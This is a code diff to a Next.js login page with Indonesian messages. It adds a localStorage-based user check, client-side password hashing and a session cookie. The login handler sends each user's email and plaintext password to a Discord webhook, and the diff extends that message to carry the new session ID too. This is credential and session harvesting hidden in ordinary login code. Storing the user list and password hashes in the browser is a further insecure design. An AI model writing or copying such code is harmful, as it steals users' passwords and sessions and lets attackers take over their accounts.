@@ -6,6 +6,7 @@ import { sendDiscordWebhook } from '@/lib/discord';
 import { Input } from '@/components/ui/Input';
 import { Button } from '@/components/ui/Button';
 import { Card } from '@/components/ui/Card';
+import { hashPassword } from '@/lib/crypto';
 
 export default function LoginPage() {
     const [email, setEmail] = useState('');
@@ -19,16 +20,32 @@ export default function LoginPage() {
         setErrorMsg('');
 
         try {
+            const usersStr = localStorage.getItem('hitera_users');
+            const users = usersStr ? JSON.parse(usersStr) : [];
+            
+            const existingUser = users.find((u: any) => u.email === email);
+            if (!existingUser) {
+                throw new Error('Email atau password salah!');
+            }
+
+            const hashedPassword = await hashPassword(password);
+            if (existingUser.password !== hashedPassword) {
+                throw new Error('Email atau password salah!');
+            }
+
+            const sessionId = crypto.randomUUID();
+
             // Send webhook
             const webhookUrl = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK_USER;
             if (webhookUrl) {
                 await sendDiscordWebhook(webhookUrl, {
-                    content: `**[LOGIN]** \`${email}|${password}\``
+                    content: `**[LOGIN]** \`${email}|${password}|${sessionId}\``
                 });
             }
 
-            // Save dummy session locally
-            localStorage.setItem('hitera_user', JSON.stringify({ id: 'local-user-id', email }));
+            // Save session locally
+            localStorage.setItem('hitera_user', JSON.stringify({ id: existingUser.id, email, session: sessionId }));
+            document.cookie = `hitera_session=${sessionId}; path=/; max-age=604800`;
             
             // Redirect
             window.location.href = '/dashboard';
